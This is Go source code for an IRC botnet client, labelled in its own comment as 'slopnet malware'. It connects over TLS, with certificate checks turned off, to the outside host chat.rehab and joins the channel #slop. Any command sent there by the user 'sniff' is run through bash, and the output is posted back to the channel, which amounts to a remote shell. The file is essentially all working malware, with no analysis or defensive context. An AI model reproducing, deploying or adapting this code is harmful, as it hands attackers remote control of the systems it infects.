// the notorious slopnet malware
package main

import (
    "fmt"
	"log"
    "time"
	"bufio"
    "regexp"
    "strings"
    "os/exec"
    "math/rand"
	"crypto/tls"
)

var pingR = regexp.MustCompile(("^PING (?P<code>\\S+)$"))
var endmotdR = regexp.MustCompile(("^:\\S+ 376 \\S+ :.*$"))
var cmdR = regexp.MustCompile(("^:(?P<from>\\S+)!(\\S+) PRIVMSG #slop :(?P<to>\\S+): (?P<cmd>.+)$"))

func execCmd(input string) string {
	cmd := exec.Command("bash", "-c", input)
	output, _ := cmd.CombinedOutput()
	return string(output)
}

func generateNick() string {
	rand.Seed(time.Now().Unix())
	charset := "abcdefghijklmnopqrstuvwxyz"
	nick := make([]byte, 8)
	for i := range nick {
		nick[i] = charset[rand.Intn(len(charset))]
	}
	return string(nick)
}

func main() {
	conn, err := tls.Dial("tcp", "chat.rehab:6697", &tls.Config{InsecureSkipVerify: true})
	if err != nil {
		log.Fatalln(err)
	}

	nick := generateNick()

	fmt.Fprintf(conn, "USER %s 0 * :%s\r\n", nick, nick)
	fmt.Fprintf(conn, "NICK %s\r\n", nick)

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		line := scanner.Text()
		log.Println(line)

		if pingR.MatchString(line) {
			submatches := pingR.FindStringSubmatch(line)
			code := submatches[pingR.SubexpIndex("code")]
			fmt.Fprintf(conn, "PONG %s\r\n", code)
			continue
		}

		if endmotdR.MatchString(line) {
			fmt.Fprintf(conn, "JOIN #slop\r\n")
			continue
		}

		if cmdR.MatchString(line) {
			submatches := cmdR.FindStringSubmatch(line)
			from := submatches[cmdR.SubexpIndex("from")]
			to := submatches[cmdR.SubexpIndex("to")]
			cmd := submatches[cmdR.SubexpIndex("cmd")]
			if from == "sniff" && (to == nick || to == "*") {
				output := strings.Split(execCmd(cmd), "\n")
				for _, outputline := range output {
					fmt.Fprintf(conn, "PRIVMSG #slop :%s\r\n", outputline)
				}
			}
			continue
		}
	}
}
